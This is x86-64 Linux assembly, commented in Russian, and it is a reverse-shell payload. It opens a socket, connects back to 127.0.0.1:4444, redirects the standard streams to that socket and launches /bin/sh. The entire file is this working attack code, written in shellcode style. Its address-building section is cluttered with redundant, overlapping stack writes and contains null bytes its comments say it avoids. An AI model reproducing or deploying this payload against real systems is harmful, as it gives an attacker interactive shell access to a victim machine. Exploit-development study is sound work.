global _start

section .text

_start:
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    ; socket(2, 1, 0)
    
    xor rax, rax
    add rax, 41         ; syscall 41 = socket
    
    xor rdi, rdi
    add rdi, 2          ; AF_INET = 2
    
    xor rsi, rsi
    inc rsi             ; SOCK_STREAM = 1
    
    xor rdx, rdx        ; Protocol = 0
    
    syscall
    
    ; Сохраняем дескриптор сокета (он вернулся в RAX) в RDI для следующего шага
    mov rdi, rax        

    ; connect(sockfd, struct sockaddr *addr, int addrlen)
    ; Структура sockaddr_in:
    ; family (2 bytes), port (2 bytes), address (4 bytes), zero (8 bytes)
    
    ; Очищаем регистр для работы со стеком
    xor rax, rax 
    push rax            ; Кладем 8 байт нулей (для padding и части IP)

    ; Строим IP 127.0.0.1 (0x7F000001) без null-байтов в коде
    
    ; Устанавливаем IP: 127.0.0.1
    mov byte [rsp+4], 0x7f  ; 127
    mov byte [rsp+7], 0x01  ; 1
    ; В памяти сейчас: xx xx xx xx 7F 00 00 01 (Little Endian нюансы, но для сети важно расположение)
    
    
    mov dword [rsp], 0x0100007f  

    xor r10, r10
    push r10        

    mov r10d, 0xFEFFFF80 
    xor r10d, 0xFFFFFFFF 
    
    
    push r10             ; Запушили IP (и мусор в старших байтах, но IP это 4 байта)
                         ; Сейчас rsp указывает на IP.
    
    mov word [rsp-2], 0x5c11 ; Порт 4444
    mov word [rsp-4], 0x0002 ; AF_INET
    sub rsp, 4               ; Сдвигаем стек на начало структуры
    
    
    ; syscall connect (42)
    xor rax, rax
    mov al, 42          ; connect
    mov rsi, rsp        ; указатель на структуру
    mov rdx, 16         ; длина структуры (16 байт)
    syscall
    
    ; dup2(sockfd, newfd)
    ; Нам нужно сделать dup2 для 0 (stdin), 1 (stdout), 2 (stderr)
    
    xor rsi, rsi
    mov si, 2           ; начинаем с 2 (stderr)
    
dup_loop:
    xor rax, rax
    mov al, 33          ; syscall 33 = dup2
    syscall             ; rdi уже содержит sockfd (мы его не трогали), rsi меняется
    
    dec rsi             ; уменьшаем счетчик
    jns dup_loop        ; прыгаем, пока флаг Sign не установлен (пока >= 0)
    
    ; --- Запуск оболочки /bin/sh ---
    ; execve("//bin/sh", NULL, NULL)
    
    xor rax, rax
    push rax            ; NULL терминатор
    
    mov rbx, 0x68732f6e69622f2f ; "//bin/sh"
    push rbx
    
    mov rdi, rsp        ; указатель на строку
    
    xor rsi, rsi        ; argv = NULL
    xor rdx, rdx        ; envp = NULL
    
    mov al, 59          ; execve
    syscall